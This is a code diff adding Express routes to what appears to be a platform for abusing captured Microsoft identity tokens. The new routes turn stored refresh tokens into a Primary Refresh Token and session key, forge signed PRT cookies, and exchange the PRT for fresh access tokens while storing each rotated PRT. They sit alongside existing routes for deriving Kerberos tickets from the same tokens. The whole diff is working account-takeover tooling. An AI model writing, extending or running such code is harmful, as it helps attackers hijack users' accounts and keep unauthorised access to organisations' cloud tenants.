@@ -1525,6 +1525,190 @@ router.post('/:id/derive-tgt', userAuth, async (req, res) => {
   }
 });
 
+// ─── PRT session key / KDF routes (GraphSpy-compatible, prtkdf.js) ─────────
+// prt-capture : Slice C — capture fresh PRT + session key from the enrolled
+//               DRS device (one token call, windows_api_version 2.2).
+// prt-cookie  : Slice A — KDF-signed x-ms-RefreshTokenCredential cookie.
+// prt-token   : Slice B — PRT -> access token (JWE-encrypted response).
+// The raw session key is NEVER returned — redacted status flags only.
+// Additive: the existing Set-Cookie PRT path is not touched.
+
+async function loadTokenRow(req, res) {
+  const [tokens] = await db.query(
+    'SELECT * FROM captured_tokens WHERE id = ? AND user_id = ?',
+    [req.params.id, req.user.id]
+  );
+  if (!tokens.length) {
+    res.status(404).json({ error: 'Token not found' });
+    return null;
+  }
+  return tokens[0];
+}
+
+// device_credentials is keyed by (user_id, tenant_id) but the token row may
+// name the tenant in either column. Try each candidate in turn and return
+// the first one that actually holds a stored session key.
+async function resolveSessionKeyForToken(token) {
+  const deviceManager = require('../services/devicemanager');
+  const candidates = [token.device_tenant_id, token.tenant].filter(Boolean);
+  for (const tenant of candidates) {
+    const materials = await deviceManager.getStoredSessionKey(token.user_id, tenant);
+    if (materials.hasSessionKey) {
+      return Object.assign({ tenant }, materials);
+    }
+  }
+  return { tenant: candidates[0] || 'common', hasSessionKey: false, sessionKey: null };
+}
+
+// Slice C — POST /:id/prt-capture
+router.post('/:id/prt-capture', userAuth, async (req, res) => {
+  try {
+    const token = await loadTokenRow(req, res);
+    if (!token) return;
+    const deviceManager = require('../services/devicemanager');
+    const refreshToken = safeDecrypt(token.refresh_token_encrypted);
+    if (!refreshToken) {
+      return res.status(409).json({ success: false, error: 'No refresh token stored for this token row — nothing to capture a PRT from.' });
+    }
+    const candidates = [token.device_tenant_id, token.tenant].filter(Boolean);
+    if (candidates.length === 0) {
+      return res.status(409).json({ success: false, error: 'Token row has no tenant (device_tenant_id/tenant) — cannot locate device credentials.' });
+    }
+    let lastErr = null;
+    for (const tenant of candidates) {
+      try {
+        const result = await deviceManager.capturePrtSessionKey(token.user_id, tenant, refreshToken);
+        // Persist the fresh PRT on the token row (encrypted, like other token material)
+        try {
+          await db.query(
+            'UPDATE captured_tokens SET prt = ? WHERE id = ? AND user_id = ?',
+            [encrypt(result.prt), token.id, token.user_id]
+          );
+        } catch (pErr) {
+          console.error('[Tokens] Failed to persist captured PRT:', pErr.message);
+        }
+        console.log('[Tokens] PRT captured for token', token.id, 'tenant', tenant, '(session key stored redacted)');
+        return res.json({
+          success: true,
+          tenant,
+          prtPrefix: result.prt.substring(0, 40),
+          prtLength: result.prt.length,
+          expiresOn: result.expiresOn,
+          user: result.user,
+          sessionKeyStored: true,
+          message: 'PRT + session key captured. The prt-cookie and prt-token routes are now available for this token.'
+        });
+      } catch (err) {
+        lastErr = err;
+        console.warn('[Tokens] prt-capture failed for tenant', tenant, ':', err.message);
+      }
+    }
+    return res.status(409).json({ success: false, error: 'PRT capture failed: ' + (lastErr ? lastErr.message : 'no device credentials for any candidate tenant') });
+  } catch (err) {
+    console.error('[Tokens] prt-capture error:', err.message);
+    res.status(500).json({ success: false, error: 'PRT capture failed: ' + err.message });
+  }
+});
+
+// Slice A — POST /:id/prt-cookie
+router.post('/:id/prt-cookie', userAuth, async (req, res) => {
+  try {
+    const token = await loadTokenRow(req, res);
+    if (!token) return;
+    const prtkdf = require('../services/prtkdf');
+    const prt = safeDecrypt(token.prt);
+    const materials = await resolveSessionKeyForToken(token);
+    if (!prt) {
+      return res.status(409).json({ success: false, error: 'No PRT stored for this token. POST /:id/prt-capture first.' });
+    }
+    if (!materials.hasSessionKey) {
+      return res.status(409).json({ success: false, error: 'No PRT session key stored for this user+tenant. POST /:id/prt-capture first.' });
+    }
+    const cookie = await prtkdf.generatePrtCookie({
+      prt,
+      sessionKey: materials.sessionKey,
+      nonce: (req.body && req.body.nonce) || null, // optional pre-fetched nonce
+    });
+    // Persist alongside the other stored PRT cookie (same convention as refreshPrtCookie)
+    try {
+      await db.query(
+        'UPDATE device_credentials SET prt_cookie_encrypted = ?, last_used = NOW(), updated_at = NOW() WHERE user_id = ? AND tenant_id = ?',
+        [encrypt(cookie.value), token.user_id, materials.tenant]
+      );
+    } catch (pErr) {
+      console.error('[Tokens] Failed to persist KDF PRT cookie:', pErr.message);
+    }
+    console.log('[Tokens] KDF PRT cookie generated for token', token.id, 'tenant', materials.tenant);
+    res.json({ success: true, cookie, message: 'KDF-signed PRT cookie generated (GraphSpy-compatible).' });
+  } catch (err) {
+    console.error('[Tokens] prt-cookie error:', err.message);
+    res.status(500).json({ success: false, error: 'PRT cookie generation failed: ' + err.message });
+  }
+});
+
+// Slice B — POST /:id/prt-token
+router.post('/:id/prt-token', userAuth, async (req, res) => {
+  try {
+    const token = await loadTokenRow(req, res);
+    if (!token) return;
+    const prtkdf = require('../services/prtkdf');
+    const prt = safeDecrypt(token.prt);
+    const materials = await resolveSessionKeyForToken(token);
+    if (!prt) {
+      return res.status(409).json({ success: false, error: 'No PRT stored for this token. POST /:id/prt-capture first.' });
+    }
+    if (!materials.hasSessionKey) {
+      return res.status(409).json({ success: false, error: 'No PRT session key stored for this user+tenant. POST /:id/prt-capture first.' });
+    }
+    const opts = req.body || {};
+    const result = await prtkdf.prtToAccessToken({
+      prt,
+      sessionKey: materials.sessionKey,
+      clientId: opts.clientId || undefined,
+      resource: opts.resource || undefined,
+      scope: opts.scope || undefined,
+      refreshPrt: opts.refreshPrt !== undefined ? opts.refreshPrt : true,
+      apiVersion: opts.apiVersion || 1,
+    });
+    // Persist the rotated PRT when AAD issued one (refreshPrt + "aza" scope)
+    if (result.refreshToken) {
+      try {
+        await db.query(
+          'UPDATE captured_tokens SET prt = ? WHERE id = ? AND user_id = ?',
+          [encrypt(result.refreshToken), token.id, token.user_id]
+        );
+        console.log('[Tokens] Rotated PRT stored for token', token.id);
+      } catch (pErr) {
+        console.error('[Tokens] Failed to store rotated PRT:', pErr.message);
+      }
+    }
+    // Store the access token with the other token material (same as /renew)
+    if (result.accessToken) {
+      try {
+        await db.query(
+          'UPDATE captured_tokens SET access_token_encrypted = ? WHERE id = ? AND user_id = ?',
+          [encrypt(result.accessToken), token.id, token.user_id]
+        );
+      } catch (pErr) {
+        console.error('[Tokens] Failed to store PRT access token:', pErr.message);
+      }
+    }
+    console.log('[Tokens] PRT->access token OK for token', token.id, 'tenant', materials.tenant, 'rotatedPrt=' + !!result.refreshToken);
+    res.json({
+      success: true,
+      accessToken: result.accessToken,
+      tokenType: result.tokenType,
+      expiresIn: result.expiresIn,
+      foci: result.foci,
+      rotatedPrt: !!result.refreshToken,
+      message: 'Access token issued from PRT (GraphSpy-compatible flow).'
+    });
+  } catch (err) {
+    console.error('[Tokens] prt-token error:', err.message);
+    res.status(500).json({ success: false, error: 'PRT token exchange failed: ' + err.message });
+  }
+});
+
 // ─── Bulk derive Kerberos TGTs for all eligible tokens ──────────────
 router.post('/bulk-derive-tgts', userAuth, async (req, res) => {
   try {
